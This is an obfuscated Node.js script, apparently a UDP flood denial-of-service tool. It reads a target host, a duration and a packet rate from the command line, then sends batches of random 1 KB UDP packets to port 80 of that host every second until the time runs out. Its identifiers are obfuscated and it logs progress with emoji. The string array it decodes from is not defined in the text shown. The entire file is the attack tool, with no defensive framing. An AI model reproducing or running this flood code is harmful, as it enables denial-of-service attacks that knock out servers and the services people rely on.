(function(_0x小吴1, _0x小吴2) {
    const _0x小吴3 = function(_0x小吴4) {
        while (--_0x小吴4) {
            _0x小吴1.push(_0x小吴1.shift());
        }
    };
    _0x小吴3(++_0x小吴2);
}(_0x小吴数组, 0x1f4));

const _0x小吴解码 = function(_0x小吴5, _0x小吴6) {
    _0x小吴5 = _0x小吴5 - 0x0;
    return _0x小吴数组[_0x小吴5];
};

const 小吴套接字=require(_0x小吴解码('0x0'));
const 小吴随机=require(_0x小吴解码('0x1'));

const 小吴参数=process[_0x小吴解码('0x2')]['slice'](0x2);
if(小吴参数['length']<0x3){
    console[_0x小吴解码('0x3')](_0x小吴解码('0x4'));
    process[_0x小吴解码('0x5')](-0x1);
}

const 小吴主机=小吴参数[0x0]['replace']('http://','')['replace']('https://','');
const 小吴时间=parseInt(小吴参数[0x1]);
const 小吴速率=parseInt(小吴参数[0x2]);
const 小吴端口=0x50;

console[_0x小吴解码('0x3')](`🔥 UDP Flood: ${小吴主机}:${小吴端口} | Duration: ${小吴时间}s | Rate: ${小吴速率} packets/s`);

const 小吴客户端=小吴套接字['createSocket']('udp4');

const 小吴间隔=setInterval(()=>{
    for(let 小吴i=0x0;小吴i<小吴速率;小吴i++){
        const 小吴消息=Buffer['from'](小吴随机['generate'](0x400));
        小吴客户端['send'](小吴消息,0x0,小吴消息['length'],小吴端口,小吴主机,(小吴错误)=>{
            if(小吴错误)console[_0x小吴解码('0x3')]("❌ UDP Error: "+小吴错误['message']);
            else console[_0x小吴解码('0x3')]("📡 UDP Packet sent to "+小吴主机);
        });
    }
},0x3e8);

setTimeout(()=>{
    clearInterval(小吴间隔);
    小吴客户端['close']();
    console[_0x小吴解码('0x3')]("✅ UDP Flood selesai!");
},小吴时间*0x3e8);